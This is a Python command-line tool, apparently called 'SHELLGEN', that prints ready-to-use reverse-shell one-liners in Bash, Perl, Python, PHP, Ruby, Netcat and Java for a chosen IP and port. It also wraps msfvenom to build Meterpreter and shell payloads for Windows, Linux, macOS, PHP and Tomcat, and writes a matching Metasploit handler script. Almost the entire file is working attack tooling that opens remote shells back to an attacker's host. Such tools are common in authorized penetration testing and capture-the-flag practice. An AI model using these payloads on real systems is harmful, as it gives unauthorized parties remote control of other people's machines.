#!/usr/bin/env python3

import shutil
import argparse
import ipaddress
import subprocess
import netifaces as ni

def check_msfvenom():
    if shutil.which('msfvenom') is not None:
        return True
    else:
        print("\nmsfvenom not installed/found, that feature will not work.")
        return False

def list_supported_shells():
    shells = ['Bash', 'Perl', 'Python', 'PHP', 'Ruby', 'Netcat', 'Java', 'Msfvenom']
    print(f"Select by number/name:\n")
    for i, shell in enumerate(shells):
        print(f"({i+1}) {shell}")

def create_handler_file(ip: str, port: int, payload: str):
    with open("handler.rc", "w") as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set payload {payload}\n")
        f.write(f"set lhost {ip}\n")
        f.write(f"set lport {port}\n")
        f.write("exploit\n")
    print(f"\nFile 'handler.rc' created. Type 'msfconsole -r handler.rc' to start the handler")

def generate_payload(ip: str, port: int, payload_type: str, file_type: str, ext: str, meterpreter: str):
    payload = f"{payload_type}/meterpreter/reverse_tcp" if meterpreter== 'y' else f"{payload_type}/shell_reverse_tcp"
    command = ['msfvenom', '-p', payload, f"LHOST={ip}", f"LPORT={port}", '-f', file_type, '-o', f"shell.{ext}"]
    print(f"Generating payload: {' '.join(command)}")
    subprocess.run(command)
    create_handler_file(ip, port, payload)

def msf(ip, port):
    print("""
#####Type#####
(1) ASP** [.asp]
(2) ASPX** [.aspx]
(3) Bash [.sh]
(4) Java [.jsp]
(5) Linux** [.elf]
(6) OSX** [.macho]
(7) Perl [.pl]
(8) PHP** [.php]
(9) Powershell** [.ps1]
(10) Python [.py]
(11) Tomcat [.jsp]
(12) Windows** [.exe]

'**' Indicates meterpreter compatibility\n""")
    
    payload_options = {
        "3": ("cmd/unix/reverse_bash", "sh", "raw"),
	    "4": ("java/jsp_shell_reverse_tcp", "jsp", "raw"),
	    "7": ("cmd/unix/reverse_perl", "pl", "raw"),
	    "11": ("java/jsp_shell_reverse_tcp", "war", "war"),
	}

    meterpreter_options = {
        "1" : ("asp", "asp", "windows"),
        "2" : ("aspx", "aspx", "windows"),
    }
    
    architecture_options = {
        '5' : {'x64': ('elf', 'elf', 'linux/x64'), 'x86': ('elf', 'elf', 'linux/x86')},
        "6" : {"x64": ("macho", "macho", "osx/x64")},
        "9" : {"x64" : ("ps1", "psh", "windows/x64"), "x86" : ("ps1", "psh", "windows")},
        "12" : {"x64" : ("exe", "exe", "windows/x64"), "x86" : ("exe", "exe", "windows")}
    }
    
    outlier_options = {
        '8': ('php/meterpreter_reverse_tcp', 'php/reverse_php'),
        '10': ('windows/shell_reverse_tcp', 'cmd/unix/reverse_python')
    }

    system_mapping = {
        'w': 'windows/shell_reverse_tcp',
        'l': 'cmd/unix/reverse_python'
    }

    try:
        choice = input("Choose a shell[1-12]: ")
        if choice in payload_options:
            payload, ext, file_type = payload_options[choice]
            print(f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file_type} -o shell.{ext}")
            subprocess.run(['msfvenom','-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', file_type, '-o', f'shell.'+ext])
            create_handler_file(ip, port, payload)
        
        elif choice in meterpreter_options:
            ext, file_type, payload_type = meterpreter_options[choice]
            meterpreter = input("Meterpreter?[y/n]: ").lower()
            generate_payload(ip, port, payload_type, file_type, ext, meterpreter)
        
        elif choice in architecture_options:
            architecture = input("Architecture?[x86/x64]: ")
            meterpreter = input("Meterpreter?[y/n]: ").lower() 
            ext, file_type, payload_type = architecture_options[choice][architecture]
            generate_payload(ip, port, payload_type, file_type, ext, meterpreter)
        
        elif choice in outlier_options:
            if choice == "8":
                meterpreter = input("Meterpreter?[y/n]: " ).lower()  
                payload = outlier_options[choice][0] if meterpreter == 'y' else outlier_options[choice][1]
                print(f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f raw -o shell.php")
                subprocess.run(['msfvenom', '-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', 'raw', '-o', 'shell.php'])
                create_handler_file(ip, port, payload)
            elif choice == "10":
                system = input("Windows or Linux?[w/l]: " ).lower()
                if system in system_mapping:
                    payload = system_mapping[system]
                    print( f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f python -o shell.py")
                    subprocess.run(['msfvenom', '-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', 'python', '-o', 'shell.py'])
                    create_handler_file(ip, port, payload)
        else:
            print("\n\nInvalid Option. Try Again.\n\n")
            msf(ip, port)
    except KeyboardInterrupt:
        print("\n\nExiting...\n\n")

def shells(ip, port, shell):
    shells = {
    'bash': [
        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n",
        f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196\n"
    ],
    'perl': [
        f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    ],
    'python': [
        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ],
    'php': [
        f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n",
        f"<?php shell_exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\"); ?>\n"
    ],    
    'ruby' : [
        f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\"{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ],
    'netcat' : [
        f"nc -e /bin/sh {ip} {port}\n\n",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\n\n",
        f"ncat {ip} {port} -e /bin/bash\n"
    ],
    'java' : [
        f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()\""
    ]
}

    list_shell = [
        (('1', 'sh', 'bash'), shells['bash']),
        (('2', 'pl', 'perl'), shells['perl']),
        (('3', 'py', 'python'), shells['python']),
        (('4', 'php'), shells['php']),
        (('5', 'rb', 'ruby'), shells['ruby']),
        (('6', 'nc', 'netcat'), shells['netcat']),
        (('7', 'java'), shells['java'])
    ]

    for keys, value in list_shell:
        if shell in keys:
            for i in value:
                print(i)
            break
    if shell in ['8', 'msf', 'msfvenom']:
        msf(ip, port)

def header():
	print("""
 ___  _   _  ____  __    __    ___  ____  _  _ 
/ __)( )_( )( ___)(  )  (  )  / __)( ___)( \\( )
\__ \ ) _ (  )__)  )(__  )(__( (_-. )__)  )  ( 
(___/(_) (_)(____)(____)(____)\___/(____)(_)\_)\n""" )
 
def interfaces():
    result = subprocess.run(
        "ip -f inet -br addr show | sed 's/@...../      /g'",
        shell=True, capture_output=True, text=True
    )
    print("\tAvailable Interfaces\n" )
    print(result.stdout)

def get_interface_ip(interface, port, shell):
	try:
		ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
		shells(ip, port, shell)
	except ValueError:
		print("Oh no, not a valid interface name.")

def main(ip, port, shell):
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        get_interface_ip(ip, port, shell)
    else:
        shells(ip, port, shell)

if __name__ == '__main__':
    check_msfvenom()
    header()

    parser = argparse.ArgumentParser(usage="%(prog)s -i <ip/interface name> -p <port> -s <shell>" )
    parser.add_argument("-l", "--list", action="store_true", help="list all shell choices")
    parser.add_argument("-i", "--ip", type=str, help="Specify ip address/interface name (REQUIRED)")
    parser.add_argument("-p", "--port", default=9999, help="Specify listen port (Default: 9999)")
    parser.add_argument("-s", "--shell", type=str, help="Specify type of shell (REQUIRED)")
    parser.add_argument("-I", "--interfaces", action="store_true", help="List all interfaces")
    args = parser.parse_args()

    if args.list:
        list_supported_shells()
    elif args.interfaces:
        interfaces()
    elif args.ip and args.shell:
        ip = args.ip
        port = str(args.port)
        shell = args.shell.lower()
        main(ip, port, shell)
    else:
        parser.print_help()
